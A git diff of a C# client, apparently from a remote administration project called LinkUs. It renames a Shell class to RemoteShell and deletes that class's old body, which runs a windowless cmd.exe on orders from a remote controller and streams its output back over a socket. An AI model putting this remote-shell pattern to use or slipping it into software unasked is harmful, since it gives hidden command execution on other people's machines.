@@ -1,11 +1,8 @@
 ﻿using System;
-using System.Diagnostics;
-using System.IO;
 using System.Linq;
 using System.Net.Sockets;
 using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
 using LinkUs.Core;
 
 namespace LinkUs.Client
@@ -15,7 +12,7 @@ namespace LinkUs.Client
         private static readonly UTF8Encoding Encoding = new UTF8Encoding();
         private static readonly ManualResetEvent ManualResetEvent = new ManualResetEvent(false);
         private static readonly ISerializer Serializer = new JsonSerializer();
-        private static Shell _shell;
+        private static RemoteShell _remoteShell;
 
         static void Main(string[] args)
         {
@@ -68,8 +65,8 @@ namespace LinkUs.Client
             var command = Serializer.Deserialize<Command>(package.Content);
             if (command.Name == "ExecuteShellCommand") {
                 var executeRemoteCommand = Serializer.Deserialize<ExecuteShellCommand>(package.Content);
-                _shell = new Shell(transmitter, package, executeRemoteCommand);
-                _shell.Execute();
+                _remoteShell = new RemoteShell(transmitter, package, executeRemoteCommand);
+                _remoteShell.Start();
             }
             else if (command.Name == "date") {
                 var packageResponse = package.CreateResponsePackage(Serializer.Serialize(DateTime.Now.ToShortDateString()));
@@ -81,93 +78,15 @@ namespace LinkUs.Client
             }
             else if (command.Name == typeof(SendInputToShellCommand).Name) {
                 var sendInputToShellCommand = Serializer.Deserialize<SendInputToShellCommand>(package.Content);
-                _shell.Write(sendInputToShellCommand.Input);
+                _remoteShell.Write(sendInputToShellCommand.Input);
             }
             else if (command.Name == typeof(KillShellCommand).Name) {
-                _shell.Stop();
+                _remoteShell.Stop();
             }
             else {
                 var packageResponse = package.CreateResponsePackage(Serializer.Serialize("unknown command"));
                 transmitter.Send(packageResponse);
             }
-        }
-    }
-
-    public class Shell
-    {
-        private readonly PackageTransmitter _packageTransmitter;
-        private readonly Package _package;
-        private readonly Process _shellProcess;
-        private readonly JsonSerializer _jsonSerializer = new JsonSerializer();
-
-        public Shell(PackageTransmitter packageTransmitter, Package package, ExecuteShellCommand executeRemoteCommand)
-        {
-            _packageTransmitter = packageTransmitter;
-            _package = package;
-            _shellProcess = NewCmdProcess();
-            if (executeRemoteCommand.CommandLine != "cmd") {
-                _shellProcess.StartInfo.Arguments = $"/C {executeRemoteCommand.CommandLine} " + string.Join(" ", executeRemoteCommand.Arguments);
-            }
-            _shellProcess.ErrorDataReceived += ShellProcessOnErrorDataReceived;
-        }
-
-        private void ShellProcessOnErrorDataReceived(object o, DataReceivedEventArgs dataReceivedEventArgs)
-        {
-            SendObject(new ShellOuputReceivedResponse(dataReceivedEventArgs.Data));
-        }
-
-        public Task Execute()
-        {
-            _shellProcess.Start();
-
-            SendObject(new ShellStartedResponse());
-
-            _shellProcess.BeginErrorReadLine();
-
-            return Task.Factory.StartNew(() => {
-                var buffer = new char[1024];
-                while (_shellProcess.StandardOutput.EndOfStream == false) {
-                    var bytesReadCount = _shellProcess.StandardOutput.Read(buffer, 0, buffer.Length);
-                    if (bytesReadCount > 0) {
-                        var textReceived = new string(buffer, 0, bytesReadCount);
-                        SendObject(new ShellOuputReceivedResponse(textReceived));
-                    }
-                }
-                SendObject(new ShellEndedResponse(_shellProcess.ExitCode));
-            });
-        }
-
-        private void SendObject(object response)
-        {
-            var content = _jsonSerializer.Serialize(response);
-            var responsePackage = _package.CreateResponsePackage(content);
-            _packageTransmitter.Send(responsePackage);
-        }
-
-        private static Process NewCmdProcess()
-        {
-            return new Process {
-                StartInfo = {
-                    FileName = Path.Combine(Environment.SystemDirectory, "cmd.exe"),
-                    Arguments = "",
-                    UseShellExecute = false,
-                    CreateNoWindow = true,
-                    ErrorDialog = false,
-                    RedirectStandardInput = true,
-                    RedirectStandardOutput = true,
-                    RedirectStandardError = true
-                },
-                EnableRaisingEvents = true
-            };
-        }
-        public void Stop()
-        {
-            _shellProcess.Kill();
-            _shellProcess.WaitForExit();
-        }
-        public void Write(string input)
-        {
-            _shellProcess.StandardInput.Write(input);
         }
     }
 }
